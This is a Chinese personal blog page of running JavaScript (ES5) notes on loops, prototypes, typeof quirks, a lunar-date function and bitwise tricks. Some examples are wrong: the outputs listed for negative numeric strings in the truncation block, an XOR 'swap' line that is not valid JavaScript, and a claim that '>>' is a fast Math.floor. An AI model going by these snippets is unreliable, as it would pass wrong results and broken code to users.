<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 【笔记】js（ES5）随手记（持续） | Wayne的博客</title><meta name="description" content="【笔记】js（ES5）随手记（持续） - Micheal Wayne"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/scss/casual.css"><link rel="stylesheet" href="/css/icon.css"><link rel="search" type="application/opensearchdescription+xml" href="http://blog.michealwayne.cn/atom.xml" title="Wayne的博客"></head><body><div class="header"><header class="site-header"><div class="site-nav"><span class="button-toggle"></span><div class="container"><div class="nav-item"><a href="/" target="_self" data-text="home">Home</a></div><div class="nav-item"><a href="/archives" target="_self" data-text="archive">Archive</a></div><div class="nav-item"><a href="/about" target="_self" data-text="about">About</a></div></div><form id="search-form" class="nav-item"><input type="text" id="local-search-input" name="q" results="0" placeholder="search" autocomplete="off" autocorrect="off" class="search form-control"><span onclick="resetSearch()" class="fa fa-times"> </span></form><div id="local-search-result"></div><p class="no-result">No results found</p></div></header></div><div class="main"><div class="container"><div class="content"><div class="post"><article class="post-block"><h1 class="post-title">【笔记】js（ES5）随手记（持续）</h1><span class="post-date">Jul 8, 2019</span><span class="post-tag"><a href="/tags/笔记/">笔记</a><a href="/tags/概念/">概念</a><a href="/tags/js/">js</a></span><img src="/images/icons/js.png" class="bgimage"><div class="post-content"><h1 id="js（ES5）随手记（持续）"><a href="#js（ES5）随手记（持续）" class="headerlink" title="js（ES5）随手记（持续）"></a>js（ES5）随手记（持续）</h1><ul>
<li>start date: 2018-08-27 13:00:45</li>
</ul>
<h2 id="1-【性能】能用-innerText-的地方不要用-innerHTML"><a href="#1-【性能】能用-innerText-的地方不要用-innerHTML" class="headerlink" title="1 【性能】能用 innerText 的地方不要用 innerHTML"></a>1 【性能】能用 innerText 的地方不要用 innerHTML</h2><p>直接看图<br><img src="/images/notes/js/innerText_innerHTML.png" alt="for"></p>
<p>*jQuery/Zepto 对应$.fn.text()和$.fn.html()。</p>
<h2 id="2-【注意】遍历数组用-for、遍历对象用-for…in"><a href="#2-【注意】遍历数组用-for、遍历对象用-for…in" class="headerlink" title="2 【注意】遍历数组用 for、遍历对象用 for…in"></a>2 【注意】遍历数组用 for、遍历对象用 for…in</h2><p>for…in 在部分机型遍历数组会输出原型属性，且 for 效率比 for…in 高。</p>
<h2 id="3-【技巧】利用运算符”-“检索字符串"><a href="#3-【技巧】利用运算符”-“检索字符串" class="headerlink" title="3 【技巧】利用运算符”~“检索字符串"></a>3 【技巧】利用运算符”~“检索字符串</h2><p>一般都是用“str.indexOf(‘test’) &gt; -1”这种形式来判断字符串 str 中是否包含”test”字符串，现在可以利用位运算符“~”：“~str.indexOf(‘test’)”，包含时返回非 0 数字，不包含时则返回 0。并且二者查询效率一致。</p>
<h2 id="4-【方法】获取农历日期"><a href="#4-【方法】获取农历日期" class="headerlink" title="4 【方法】获取农历日期"></a>4 【方法】获取农历日期</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @param date &#123;Time Object&#125; 日期</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLunarDate</span>(<span class="params">date</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> TIAN_GAN = [<span class="string">'甲'</span>, <span class="string">'乙'</span>, <span class="string">'丙'</span>, <span class="string">'丁'</span>, <span class="string">'戊'</span>, <span class="string">'己'</span>, <span class="string">'庚'</span>, <span class="string">'辛'</span>, <span class="string">'壬'</span>, <span class="string">'癸'</span>];</span><br><span class="line">  <span class="keyword">var</span> DI_ZHI = [<span class="string">'子'</span>, <span class="string">'丑'</span>, <span class="string">'寅'</span>, <span class="string">'卯'</span>, <span class="string">'辰'</span>, <span class="string">'巳'</span>, <span class="string">'午'</span>, <span class="string">'未'</span>, <span class="string">'申'</span>, <span class="string">'酉'</span>, <span class="string">'戌'</span>, <span class="string">'亥'</span>];</span><br><span class="line">  <span class="keyword">var</span> SHI = [<span class="string">'初'</span>, <span class="string">'十'</span>, <span class="string">'廿'</span>, <span class="string">'三'</span>];</span><br><span class="line">  <span class="keyword">var</span> YUE = [<span class="string">''</span>, <span class="string">'十'</span>];</span><br><span class="line">  <span class="keyword">var</span> GE = [<span class="string">'一'</span>, <span class="string">'二'</span>, <span class="string">'三'</span>, <span class="string">'四'</span>, <span class="string">'五'</span>, <span class="string">'六'</span>, <span class="string">'七'</span>, <span class="string">'八'</span>, <span class="string">'九'</span>, <span class="string">'十'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> locale = <span class="string">'zh-TW-u-ca-chinese'</span>;</span><br><span class="line">  <span class="keyword">var</span> fmt = <span class="function"><span class="keyword">function</span> (<span class="params">key, d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Intl</span>.DateTimeFormat(locale, &#123; [key]: <span class="string">'numeric'</span> &#125;)</span><br><span class="line">      .format(d || date)</span><br><span class="line">      .match(<span class="regexp">/\d+/</span>)[<span class="number">0</span>];</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> isLeapMonth = <span class="function"><span class="keyword">function</span> (<span class="params">d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _date = <span class="keyword">new</span> <span class="built_in">Date</span>(date);</span><br><span class="line">    _date.setDate(-d);</span><br><span class="line">    <span class="keyword">return</span> fmt(<span class="string">'month'</span>, _date) === m;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> y = fmt(<span class="string">'year'</span>);</span><br><span class="line">  <span class="keyword">var</span> m = fmt(<span class="string">'month'</span>);</span><br><span class="line">  <span class="keyword">var</span> d = fmt(<span class="string">'day'</span>);</span><br><span class="line"></span><br><span class="line">  isL = isLeapMonth(d);</span><br><span class="line"></span><br><span class="line">  y = TIAN_GAN[(y - <span class="number">1</span>) % <span class="number">10</span>] + DI_ZHI[(y - <span class="number">1</span>) % <span class="number">12</span>];</span><br><span class="line">  m = (YUE[((m - <span class="number">1</span>) / <span class="number">10</span>) | <span class="number">0</span>] + GE[(m - <span class="number">1</span>) % <span class="number">10</span>]).replace(<span class="regexp">/^一$/</span>, <span class="string">'正'</span>);</span><br><span class="line">  d = (SHI[(d / <span class="number">10</span>) | <span class="number">0</span>] + GE[(d - <span class="number">1</span>) % <span class="number">10</span>]).replace(<span class="regexp">/^十十$/</span>, <span class="string">'初十'</span>).replace(<span class="regexp">/^廿十$/</span>, <span class="string">'二十'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> y + <span class="string">'年'</span> + (isL ? <span class="string">'閏'</span> : <span class="string">''</span>) + m + <span class="string">'月'</span> + d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _time = getLunarDate(<span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'2018/10/10'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(_time); <span class="comment">// 戊戌年九月初二</span></span><br></pre></td></tr></table></figure>
<h2 id="5-柯里化"><a href="#5-柯里化" class="headerlink" title="5 柯里化"></a>5 柯里化</h2><p>在计算机科学中，柯里化（Currying）是把接受多个参数的函数变换成接受一个单一参数(最初函数的第一个参数)的函数，并且返回接受余下的参数且返回结果的新函数的技术。这个技术由 Christopher Strachey 以逻辑学家 Haskell Curry 命名的，尽管它是 Moses Schnfinkel 和 Gottlob Frege 发明的。</p>
<p>如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> curry = <span class="function">(<span class="params">fn, arr = []</span>) =&gt;</span> <span class="function">(<span class="params">...args</span>) =&gt;</span></span><br><span class="line">  (<span class="function"><span class="params">arg</span> =&gt;</span> (arg.length === fn.length ? fn(...arg) : curry(fn, arg)))([...arr, ...args]);</span><br></pre></td></tr></table></figure>
<p>如 ES6</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x =&gt; <span class="function"><span class="params">y</span> =&gt;</span> x + y;</span><br></pre></td></tr></table></figure>
<h2 id="6-for-循环的算法优化"><a href="#6-for-循环的算法优化" class="headerlink" title="6 for 循环的算法优化"></a>6 for 循环的算法优化</h2><p>例：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 比如console输出每项</span></span><br></pre></td></tr></table></figure>
<h3 id="6-1-性能最差"><a href="#6-1-性能最差" class="headerlink" title="6.1 性能最差"></a>6.1 性能最差</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(arr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="6-2-性能很好"><a href="#6-2-性能很好" class="headerlink" title="6.2 性能很好"></a>6.2 性能很好</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = arr.length; i &lt; len; i++) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(arr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="6-3-性能最好"><a href="#6-3-性能最好" class="headerlink" title="6.3 性能最好"></a>6.3 性能最好</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, item; (item = arr[i++]); ) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = arr.length; i--; ) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(arr[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="7-生成格式化-JSON-字符串"><a href="#7-生成格式化-JSON-字符串" class="headerlink" title="7 生成格式化 JSON 字符串"></a>7 生成格式化 JSON 字符串</h2><p>例：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="number">1</span>,</span><br><span class="line">  b: [<span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">  c: &#123;</span><br><span class="line">    c1: <span class="number">4</span>,</span><br><span class="line">    c2: <span class="number">5</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  d: <span class="number">6</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(obj, <span class="literal">null</span>, <span class="number">4</span>); <span class="comment">// 缩进4格</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(obj, <span class="literal">null</span>, <span class="string">'\t'</span>); <span class="comment">// tab</span></span><br></pre></td></tr></table></figure>
<h2 id="8-prototype-和-proto"><a href="#8-prototype-和-proto" class="headerlink" title="8 prototype 和__proto__"></a>8 prototype 和__proto__</h2><p>prototype 和__proto__都指向原型对象，任意一个函数（包括构造函数）都有一个 prototype 属性，指向该函数的原型对象，同样任意一个构造函数实例化的对象，都有一个__proto__属性（__proto__并非标准属性，ECMA-262 第 5 版将该属性或指针称为[[Prototype]]，可通过 Object.getPrototypeOf()标准方法访问该属性），指向构造函数的原型对象。</p>
<p>任何对象都有一个__proto__属性；任何方法都有一个 prototype 属性；prototype 属性也是一个对象，所以也有一个__proto__属性。</p>
<p>js 中的对象都是 new 构造函数创建的。而这个构造函数就是我们定义的函数；而所有的对象中都有__proto__属性，这个属性就是一个指针，指向构造函数中的 prototype 属性。<br>如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factory</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> factory();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(factory.prototype === obj.__proto__); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>每个对象都有一个__proto__属性，指向创建该对象的函数的 prototype。<strong>但是 Object.prototype 确实一个特例——它的__proto__指向的是 null！</strong></p>
<h3 id="检查当前环境是否可以使用对象的-proto-属性"><a href="#检查当前环境是否可以使用对象的-proto-属性" class="headerlink" title="检查当前环境是否可以使用对象的 proto 属性"></a>检查当前环境是否可以使用对象的 <strong>proto</strong> 属性</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> hasProto = <span class="string">'__proto__'</span> <span class="keyword">in</span> &#123;&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p><strong>proto</strong>属性很特殊，它提供了 Object.getPrototypeOf 方法所不具备的额外能力，即修改对象原型链接的能力。</p>
<p>但是在业务代码里一定要避免修改<strong>proto</strong>属性</p>
<ul>
<li>最明显的原因是可移植性的问题。并不是所有的平台都支持修改对象原型的特性，所以无法编写可移植的代码。</li>
<li>另一个原因是性能问题。所有现代的 js 引擎都深度优化了获取和设置对象属性的行为，因为这些都是一些常见的 js 操作。这些优化都是基于引擎对对象结构的认识上。当更改了对象的内部结构（如添加或删除该对象或其原型链中的对象的属性），将会使一些优化失效。修改<strong>proto</strong>属性实际上改变了继承结构本身，这可能是最具破坏性的修改。</li>
<li>最大的原因是为了保持行为的可预测性。对象的原型链通过其一套确定的属性及属性值来定义它的行为。修改对象的原型链就像对其进行“大脑移植”，这会交换对象的整个层次结构。在某些情况下这样的操作可能是有用的，但是保持继承层次结构的相对稳定是一个基本的原则。</li>
</ul>
<p><strong>可以使用 ES5 中的 Object.create 函数来创建一个具有自定义原型链的新对象</strong>。</p>
<h3 id="instanceof-原理"><a href="#instanceof-原理" class="headerlink" title="instanceof 原理"></a>instanceof 原理</h3><p>instanceof 表示的就是一种继承关系，或者原型链的结构。<br>如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A instanceof B</span><br></pre></td></tr></table></figure>
<p>instanceof 的判断队则是：沿着 A 的__proto__这条线来找，同时沿着 B 的 prototype 这条线来找，如果两条线能找到同一个引用，即同一个对象，那么就返回 true。如果找到终点还未重合，则返回 false。（所以会出现 Object instanceof Function === true 和 Function instanceof Object === true）。</p>
<p><img src="/images/js/p-proto.jpg" alt="p-proto.jpg"></p>
<h2 id="9-特殊的-typeof"><a href="#9-特殊的-typeof" class="headerlink" title="9 特殊的 typeof"></a>9 特殊的 typeof</h2><h3 id="1-typeof-null"><a href="#1-typeof-null" class="headerlink" title="1.typeof null"></a>1.typeof null</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="literal">null</span>); <span class="comment">// 'object'</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">null</span> <span class="keyword">instanceof</span> <span class="built_in">Object</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>在 JavaScript 的最初版本中，JavaScript 中的值是由一个表示类型的标签和实际数据值表示的，使用的 32 位系统，为了性能考虑使用低位存储了变量的类型信息：</p>
<ul>
<li><code>000</code>（标签是 0）：对象；</li>
<li><code>1</code>：整数；</li>
<li><code>010</code>：浮点数；</li>
<li><code>100</code>：字符串；</li>
<li><code>110</code>：布尔；</li>
</ul>
<p>有 2 个值比较特殊：</p>
<ul>
<li>undefined：用 -2^{30} （−2^30）表示。</li>
<li>null：对应机器码的 NULL 指针，一般是全零（大多数平台下是<code>0x00</code>）。</li>
</ul>
<p>typeof 的判断原理</p>
<ul>
<li>（1）：判断是否为 undefined；</li>
<li>（2）：如果不是 undefined，判断是否为对象</li>
<li>（3）：如果不是对象，判断是否为数字</li>
<li>（4）：判断字符串、布尔值。。。</li>
</ul>
<p>这样一来， null 就出了一个“bug”。根据 type tags 信息，低位是 000，因此 null 被判断成了一个对象。这就是为什么 typeof null 的返回值是 “object”。</p>
<h3 id="2-typeof-document-all"><a href="#2-typeof-document-all" class="headerlink" title="2.typeof document.all"></a>2.typeof document.all</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> <span class="built_in">document</span>.all); <span class="comment">// 'undefined'</span></span><br></pre></td></tr></table></figure>
<p>document.all 的类型标记为“undefined”的情况必须被列为违反规则的特殊情况。原因是因为 IE4：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">浏览器刚刚出现，很多功能不完善，比如 document.getElementById，都有很多浏览器不支持。甚至连 W3C 都还没制定出 Web 标准，这个时候 IE 4（我擦我都没见过 IE 4）推出了一些 API，只有 IE 4 支持，其中就包括我们今天说 document.all，它比 document.getElementById 要好用一些，比如你可以用 document.all[‘topbar’] 来获取元素。</span><br><span class="line">其他浏览器（网景）觉得 IE 4 有的功能，我也要有才行。于是也加上 document.all，功能一样，可以获取元素。</span><br><span class="line">但是呢，其他浏览器又不想被某些程序员认为是 IE，于是 typeof document.all 的值定为 undefined。</span><br></pre></td></tr></table></figure>
<h3 id="3-typeof-alert"><a href="#3-typeof-alert" class="headerlink" title="3.typeof alert"></a>3.typeof alert</h3><p>IE6、7、8 的结果是”object”，其他是”function”。</p>
<h3 id="4-typeof-正则表达式"><a href="#4-typeof-正则表达式" class="headerlink" title="4.typeof 正则表达式"></a>4.typeof 正则表达式</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> /s/ === <span class="string">'function'</span>; <span class="comment">// Chrome 1-12 , 不符合 ECMAScript 5.1</span></span><br><span class="line"><span class="keyword">typeof</span> /s/ === <span class="string">'object'</span>; <span class="comment">// Firefox 5+ , 符合 ECMAScript 5.1</span></span><br></pre></td></tr></table></figure>
<h2 id="10-工程思想——“SOLID”五大原则："><a href="#10-工程思想——“SOLID”五大原则：" class="headerlink" title="10 工程思想——“SOLID”五大原则："></a>10 工程思想——“SOLID”五大原则：</h2><p>SOLID 是为了实现“高内聚、低耦合”的目标。</p>
<ul>
<li>Single Responsibility Principle 单一责任原则</li>
<li>The Open Closed Principle 开放封闭原则（常用）</li>
<li>The Liskov Substitution Principle 里氏替换原则</li>
<li>The Dependency Inversion Principle 依赖倒置原则</li>
<li>The Interface Segregation Principle 接口分离原则</li>
</ul>
<p>其中开放封闭原则：</p>
<blockquote>
<p>A software artifact should be open for extension but closed for modification.</p>
</blockquote>
<p>软件系统的核心逻辑都不应该轻易改变，否则会破坏系统的稳定性和增加测试成本。我们应当建立合适的抽象并统一接口，当业务需要扩展时，我们可以通过增加实体类来完成。</p>
<h2 id="11-V8-引擎"><a href="#11-V8-引擎" class="headerlink" title="11 V8 引擎"></a>11 V8 引擎</h2><p>V8 引擎由两个主要部件组成:</p>
<ul>
<li>Memory Heap(内存堆) —  内存分配地址的地方</li>
<li>call Stack(调用堆栈) — 代码执行的地方</li>
</ul>
<h2 id="12-位运算符的使用"><a href="#12-位运算符的使用" class="headerlink" title="12 位运算符的使用"></a>12 位运算符的使用</h2><blockquote>
<p>当进行数字运算时，位运算操作要比任何布尔运算或者算数运算快</p>
</blockquote>
<h3 id="12-1-判断数字奇偶性：-amp"><a href="#12-1-判断数字奇偶性：-amp" class="headerlink" title="12.1 判断数字奇偶性：&amp;"></a>12.1 判断数字奇偶性：<code>&amp;</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">奇数 &amp; 1 = 1;</span><br><span class="line">偶数 &amp; 1 = 0;</span><br></pre></td></tr></table></figure>
<p>如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num1 = <span class="number">10</span>,</span><br><span class="line">  num2 = <span class="number">13</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(num1 &amp; <span class="number">1</span>); <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">console</span>.log(num2 &amp; <span class="number">1</span>); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<h3 id="12-2-取整（舍弃小数部分）：-gt-gt-lt-lt-gt-gt-gt"><a href="#12-2-取整（舍弃小数部分）：-gt-gt-lt-lt-gt-gt-gt" class="headerlink" title="12.2 取整（舍弃小数部分）：~~/&gt;&gt;/&lt;&lt;/&gt;&gt;&gt;/|"></a>12.2 取整（舍弃小数部分）：<code>~~/&gt;&gt;/&lt;&lt;/&gt;&gt;&gt;/|</code></h3><p>注：&gt;&gt;&gt;不可用于负数。<br>如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正数</span></span><br><span class="line"><span class="built_in">console</span>.log(~~<span class="number">5.21</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">5.21</span> &gt;&gt; <span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">5.21</span> &lt;&lt; <span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">5.21</span> | <span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">5.21</span> &gt;&gt;&gt; <span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 负数</span></span><br><span class="line"><span class="built_in">console</span>.log(~~<span class="number">-5.21</span>); <span class="comment">// -5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">-5.21</span> &gt;&gt; <span class="number">0</span>); <span class="comment">// -5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">-5.21</span> &lt;&lt; <span class="number">0</span>); <span class="comment">// -5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">-5.21</span> | <span class="number">0</span>); <span class="comment">// -5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">-5.21</span> &gt;&gt;&gt; <span class="number">0</span>); <span class="comment">// 4294967291，所以不可使用&gt;&gt;&gt;对负数进行取整</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串正数</span></span><br><span class="line"><span class="built_in">console</span>.log(~~<span class="string">'5.21'</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'5.21'</span> &gt;&gt; <span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'5.21'</span> &lt;&lt; <span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'5.21'</span> | <span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'5.21'</span> &gt;&gt;&gt; <span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串负数</span></span><br><span class="line"><span class="built_in">console</span>.log(~~<span class="string">'-5.21'</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'-5.21'</span> &gt;&gt; <span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'-5.21'</span> &lt;&lt; <span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'-5.21'</span> | <span class="number">0</span>); <span class="comment">// 5</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'-5.21'</span> &gt;&gt;&gt; <span class="number">0</span>); <span class="comment">// 4294967291，所以不可使用&gt;&gt;&gt;对字符串负数进行取整</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 空字符串</span></span><br><span class="line"><span class="built_in">console</span>.log(~~<span class="string">''</span>); <span class="comment">// 0  同其他</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// boolean</span></span><br><span class="line"><span class="built_in">console</span>.log(~~<span class="literal">true</span>); <span class="comment">// 1  同其他</span></span><br><span class="line"><span class="built_in">console</span>.log(~~<span class="literal">false</span>); <span class="comment">// 0  同其他</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(~~<span class="literal">undefined</span>); <span class="comment">// 0  同其他</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// null</span></span><br><span class="line"><span class="built_in">console</span>.log(~~<span class="literal">null</span>); <span class="comment">// 0  同其他</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// NaN</span></span><br><span class="line"><span class="built_in">console</span>.log(~~<span class="literal">NaN</span>); <span class="comment">// 0  同其他</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>&gt;&gt;</code>实际上是一个快速的 Math.floor()函数，速度有提升。</p>
</blockquote>
<h3 id="12-3-经典题，数字交换"><a href="#12-3-经典题，数字交换" class="headerlink" title="12.3 经典题，数字交换"></a>12.3 经典题，数字交换</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>,</span><br><span class="line">  b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">a ^= b;</span><br><span class="line">b ^= a;</span><br><span class="line">a ^= b;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a, b); <span class="comment">// 2 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 变态版</span></span><br><span class="line">a = a ^ b ^ a = a ^ a ^ b = <span class="number">0</span> ^ b = b;</span><br></pre></td></tr></table></figure>
